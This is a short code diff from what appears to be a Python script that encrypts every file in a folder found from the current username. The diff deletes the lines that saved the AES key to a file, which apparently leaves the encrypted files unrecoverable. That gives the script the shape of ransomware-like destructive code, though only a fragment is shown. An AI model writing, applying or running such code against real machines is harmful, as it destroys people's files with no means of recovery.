@@ -45,10 +45,6 @@ def encrypt_whole(folder_path, password):
                 encrypt_file(file_path, key, iv)
                 print(f"Encrypted: {file_path}")
 
-    cwd = os.getcwd()
-    with open("aes-key", "wb") as open_key:
-        open_key.write(key)
-
 # Main function
 # Detects username, assembles path and calls function from above to encrypt
 if __name__ == "__main__":
